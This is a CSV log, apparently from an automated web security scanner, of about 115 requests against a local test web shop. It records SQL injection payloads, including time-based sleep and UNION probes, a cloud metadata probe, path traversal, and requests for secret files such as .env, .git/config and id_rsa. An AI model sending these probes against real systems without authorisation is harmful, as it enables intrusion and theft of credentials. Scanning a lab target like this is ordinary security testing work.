Id,Request Tijdstempel,Response Tijdstempel,Methode,URL,Code,Reden,RTT,Grootte Resp. Header,Grootte Resp. Body
224,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+AND+%271%27%3D%272%27+--+,503,Service Unavailable,41,214,145
225,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+OR+%271%27%3D%271%27+--+,503,Service Unavailable,26,214,145
226,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+AND+%271%27%3D%272%27+--+,503,Service Unavailable,27,214,145
227,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+OR+%271%27%3D%271%27+--+,503,Service Unavailable,10,214,145
228,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+UNION+ALL+select+NULL+--+,503,Service Unavailable,60,214,145
229,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+UNION+ALL+select+NULL+--+,503,Service Unavailable,9,214,145
230,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22+UNION+ALL+select+NULL+--+,503,Service Unavailable,9,214,145
231,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%29+UNION+ALL+select+NULL+--+,503,Service Unavailable,13,214,145
232,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27%29+UNION+ALL+select+NULL+--+,503,Service Unavailable,13,214,145
233,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,15,214,145
234,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,31,214,145
235,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,19,214,145
236,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+%2F+sleep%2815%29+,503,Service Unavailable,81,214,145
237,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+%2F+sleep%2815%29+%2F+%27,503,Service Unavailable,20,214,145
238,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22+%2F+sleep%2815%29+%2F+%22,503,Service Unavailable,28,214,145
239,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+and+0+in+%28select+sleep%2815%29+%29+--+,503,Service Unavailable,24,214,145
240,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+and+0+in+%28select+sleep%2815%29+%29+--+,503,Service Unavailable,27,214,145
241,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22+and+0+in+%28select+sleep%2815%29+%29+--+,503,Service Unavailable,19,214,145
242,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,18,214,145
243,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,23,214,145
244,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,503,Service Unavailable,20,214,145
245,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,503,Service Unavailable,16,214,145
246,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,503,Service Unavailable,48,214,145
247,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,503,Service Unavailable,14,214,145
248,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%22java.lang.Thread.sleep%22%2815000%29,503,Service Unavailable,27,214,145
249,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,26,214,145
250,Mon Mar 20 21:51:24 CET 2023,Mon Mar 20 21:51:24 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,323,214,145
251,Mon Mar 20 21:51:24 CET 2023,Mon Mar 20 21:51:24 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29,503,Service Unavailable,60,214,145
252,Mon Mar 20 21:51:24 CET 2023,Mon Mar 20 21:51:24 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+,503,Service Unavailable,25,214,145
253,Mon Mar 20 21:51:24 CET 2023,Mon Mar 20 21:51:24 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%27,503,Service Unavailable,35,214,145
254,Mon Mar 20 21:51:24 CET 2023,Mon Mar 20 21:51:24 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%22,503,Service Unavailable,40,214,145
255,Mon Mar 20 21:51:24 CET 2023,Mon Mar 20 21:51:24 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+and+exists+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+--+,503,Service Unavailable,20,214,145
256,Mon Mar 20 21:51:25 CET 2023,Mon Mar 20 21:51:28 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,2997,214,145
257,Mon Mar 20 21:51:29 CET 2023,Mon Mar 20 21:51:30 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,1123,214,145
258,Mon Mar 20 21:51:30 CET 2023,Mon Mar 20 21:51:36 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/case+when+cast%28pg_sleep%2815%29+as+varchar%29+%3E+%27%27+then+0+else+1+end,503,Service Unavailable,5513,214,145
259,Mon Mar 20 21:51:36 CET 2023,Mon Mar 20 21:51:47 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/case+when+cast%28pg_sleep%2815%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,503,Service Unavailable,10959,214,145
260,Mon Mar 20 21:51:48 CET 2023,Mon Mar 20 21:51:57 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27case+when+cast%28pg_sleep%2815%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,503,Service Unavailable,9614,214,145
261,Mon Mar 20 21:51:57 CET 2023,Mon Mar 20 21:51:58 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%22case+when+cast%28pg_sleep%2815%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,503,Service Unavailable,260,214,145
262,Mon Mar 20 21:51:58 CET 2023,Mon Mar 20 21:51:58 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+%2F+case+when+cast%28pg_sleep%2815%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+,503,Service Unavailable,17,214,145
263,Mon Mar 20 21:51:58 CET 2023,Mon Mar 20 21:51:58 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,30,214,145
264,Mon Mar 20 21:51:58 CET 2023,Mon Mar 20 21:51:58 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,10,214,145
265,Mon Mar 20 21:51:58 CET 2023,Mon Mar 20 21:51:58 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,31,214,145
266,Mon Mar 20 21:51:58 CET 2023,Mon Mar 20 21:51:58 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/case+randomblob%28100000%29+when+not+null+then+1+else+1+end+,503,Service Unavailable,11,214,145
267,Mon Mar 20 21:51:58 CET 2023,Mon Mar 20 21:51:58 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/case+randomblob%281000000%29+when+not+null+then+1+else+1+end+,503,Service Unavailable,7,214,145
268,Mon Mar 20 21:51:58 CET 2023,Mon Mar 20 21:51:58 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/case+randomblob%2810000000%29+when+not+null+then+1+else+1+end+,503,Service Unavailable,9,214,145
269,Mon Mar 20 21:51:58 CET 2023,Mon Mar 20 21:51:58 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/t42q6te8zqg4ivyvzugspvyn3gqqzqkwu7yttzntc5omeuno0ynrvckvtl,503,Service Unavailable,20,214,145
270,Mon Mar 20 21:51:58 CET 2023,Mon Mar 20 21:51:58 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/case+randomblob%28100000000%29+when+not+null+then+1+else+1+end+,503,Service Unavailable,64,214,145
271,Mon Mar 20 21:51:58 CET 2023,Mon Mar 20 21:51:58 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/sxs90mnk71q4gylka2kvs72jr8kbtn6ksfhzoog2ahwqi1y87rlzvlmt611,503,Service Unavailable,27,214,145
272,Mon Mar 20 21:51:58 CET 2023,Mon Mar 20 21:51:58 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/case+randomblob%281000000000%29+when+not+null+then+1+else+1+end+,503,Service Unavailable,29,214,145
273,Mon Mar 20 21:51:59 CET 2023,Mon Mar 20 21:51:59 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,45,214,145
274,Mon Mar 20 21:52:17 CET 2023,Mon Mar 20 21:52:17 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,242,328,51
275,Mon Mar 20 21:52:17 CET 2023,Mon Mar 20 21:52:17 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,158,328,51
276,Mon Mar 20 21:52:17 CET 2023,Mon Mar 20 21:52:17 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,26,326,51
277,Mon Mar 20 21:52:17 CET 2023,Mon Mar 20 21:52:17 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,40,326,51
278,Mon Mar 20 21:52:17 CET 2023,Mon Mar 20 21:52:17 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,64,327,51
279,Mon Mar 20 21:52:17 CET 2023,Mon Mar 20 21:52:17 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,41,327,51
280,Mon Mar 20 21:52:17 CET 2023,Mon Mar 20 21:52:17 CET 2023,GET,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/items/,404,Not Found,154,431,63
281,Mon Mar 20 21:52:17 CET 2023,Mon Mar 20 21:52:17 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,54,326,51
282,Mon Mar 20 21:52:17 CET 2023,Mon Mar 20 21:52:17 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,30,326,51
283,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/elmah.axd,404,Not Found,7,430,22
284,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/trace.axd,404,Not Found,10,428,67
285,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/.htaccess,404,Not Found,48,426,67
286,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/.env,404,Not Found,17,426,62
287,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/lfm.php,404,Not Found,34,430,20
288,Mon Mar 20 21:52:17 CET 2023,Mon Mar 20 21:52:17 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/,200,OK,248,229,84
289,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/.idea/WebServers.xml,404,Not Found,12,430,33
290,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/config/databases.yml,404,Not Found,15,427,33
291,Mon Mar 20 21:52:17 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,https://location.services.mozilla.com/v1/country?key=no-mozilla-api-key,200,OK,1337,483,53
292,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/config/database.yml,404,Not Found,49,430,32
293,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/.git/config,404,Not Found,5,430,24
294,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/.svn/entries,404,Not Found,13,428,25
295,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/elmah.axd,404,Not Found,7,430,22
296,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/.svn/wc.db,404,Not Found,49,436,23
297,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/CVS/root,404,Not Found,10,428,21
298,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/server-status,404,Not Found,11,428,26
299,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/core,404,Not Found,6,428,17
300,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/sftp-config.json,404,Not Found,70,428,29
301,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/trace.axd,200,OK,152,229,84
302,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/WS_FTP.ini,404,Not Found,20,426,23
303,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/ws_ftp.ini,404,Not Found,23,426,23
304,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/WS_FTP.INI,404,Not Found,10,426,23
305,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/filezilla.xml,404,Not Found,9,426,26
306,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/sitemanager.xml,404,Not Found,50,428,28
307,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/FileZilla.xml,404,Not Found,13,426,26
308,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/winscp.ini,404,Not Found,12,428,23
309,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/WinSCP.ini,404,Not Found,12,428,23
310,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/.DS_Store,404,Not Found,55,428,22
311,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/.php_cs.cache,404,Not Found,11,428,26
312,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/DEADJOE,404,Not Found,35,426,20
313,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/.htaccess,200,OK,270,229,84
315,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/sites/default/private/files/backup_migrate/scheduled/test.txt,404,Not Found,47,430,74
316,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:18 CET 2023,GET,http://172.18.0.4:30001/app/etc/local.xml,404,Not Found,10,430,30
317,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/server.key,404,Not Found,10,432,23
318,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/privatekey.key,404,Not Found,10,428,27
319,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/myserver.key,404,Not Found,8,432,25
320,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/key.pem,404,Not Found,17,431,20
321,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/id_rsa,404,Not Found,25,429,19
322,Mon Mar 20 21:52:18 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,https://location.services.mozilla.com/v1/country?key=no-mozilla-api-key,200,OK,259,483,53
323,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/id_dsa,404,Not Found,46,428,19
324,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/.ssh/id_rsa,404,Not Found,16,426,24
325,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/.ssh/id_dsa,404,Not Found,7,428,24
326,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/adminer.php,404,Not Found,47,426,24
327,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/.env,200,OK,220,229,84
328,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/vb_test.php,404,Not Found,12,428,24
329,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/CHANGELOG.txt,404,Not Found,16,426,26
330,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/lfm.php,404,Not Found,22,430,20
331,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/sites/default/files/.ht.sqlite,404,Not Found,53,430,43
332,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/.idea/WebServers.xml,404,Not Found,31,426,33
333,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/config/databases.yml,404,Not Found,12,426,33
334,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/composer.json,404,Not Found,25,428,26
335,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/config/database.yml,404,Not Found,16,428,32
336,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/composer.lock,404,Not Found,56,431,26
337,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/.git/config,404,Not Found,55,427,24
338,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/vim_settings.xml,404,Not Found,14,426,29
339,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/.svn/entries,404,Not Found,99,429,25
340,Mon Mar 20 21:52:19 CET 2023,Mon Mar 20 21:52:19 CET 2023,GET,http://172.18.0.4:30001/server-info,404,Not Found,92,429,24
